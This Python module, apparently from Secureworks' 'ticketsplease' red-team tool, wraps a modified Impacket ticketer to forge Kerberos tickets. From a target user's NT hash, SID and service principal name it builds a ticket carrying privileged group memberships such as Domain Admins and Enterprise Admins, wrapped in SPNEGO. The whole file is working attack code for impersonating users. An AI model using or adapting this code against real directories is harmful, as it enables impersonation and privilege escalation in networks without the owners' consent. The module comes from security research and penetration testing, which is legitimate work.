# Copyright 2021 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging
from typing import Tuple
from ticketsplease.modules.ticket.impacketx import TICKETER


class TicketerNS:
    """Custom Namespace for TICKETER class"""

    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)


class KRB_TGT:
    """Generate a Kerberos ticket using Impacket's ticker.py script that we
    modified to allow us to create a valid AP_REQ wrapped in SPNEGO."""

    def _ticketer_ns(self) -> TicketerNS:
        """This is a helper function to replace the argparse in the example script
        and generate a custom Namespace.

        References:
            https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py#L726
        """
        arguments = {
            "target": None,
            "spn": None,
            "domain": None,
            "domain_sid": None,
            "aesKey": None,
            "nthash": None,
            "keytab": None,
            "extra_sid": None,
            "user": None,
            "password": None,
            "hashes": None,
            "dc_ip": None,
            "ts": False,
            "debug": False,
            "user_id": None,
            "duration": "10",  # 10 hours
            "groups": "513, 512, 520, 518, 519",
            "request": False,
        }
        options = TicketerNS(**arguments)
        return options

    @classmethod
    def run(
        cls,
        user: str,
        spn: str,
        domain: str,
        sid: str,
        hash: str,
    ) -> Tuple:
        """Generate a Kerberos ticket using Impacket's ticker.py script that we
        modified to allow us to create a valid AP_REQ wrapped in SPNEGO.
        Publicly accessible class method to generate an KBR_TGT.

        Arguments:
            user: target user to gen ticket for
            spn: <service>/<server> (i.e. host/sts.company.com)
            domain: target domain for user
            sid: SID for target user
            hash: hash for target user

        Returns:
            KRB_TGT
        """
        # Create a TICKETER Namespace
        options = cls._ticketer_ns(cls)

        # Map our collected/provided data to the namespace
        options.target = user
        options.domain = domain
        options.nthash = hash
        options.spn = spn

        # Extract the user and domain sids
        # Via: https://github.com/Gerenios/AADInternals/blob/master/Kerberos.ps1#L52
        # Grab the only the S-1-5 and the subauthority values
        options.domain_sid = "-".join(sid.split("-")[:-1])
        # Grab only the RID
        options.user_id = sid.split("-")[-1]

        logging.info(f"[ * ] Generating Kerberos ticket")

        try:
            # Create our TICKETER instance and generate a TGT/TGS ticket
            # Via: https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
            executer = TICKETER(
                options.target,
                options.password,
                options.domain,
                options,
            )

            # Retrieve the ticket values from our modified TICKETER class
            (ticket, cipher, sessionKey) = executer.run()
        except Exception as e:
            logging.error(e)
            raise TypeError("failed to create Kerberos ticket") from e

        logging.debug(f"\tKRB_TGT cipher:     {cipher.enctype}")
        logging.debug(f"\tKRB_TGT sessionKey: {sessionKey.contents.decode()}")

        return (ticket, cipher, sessionKey)
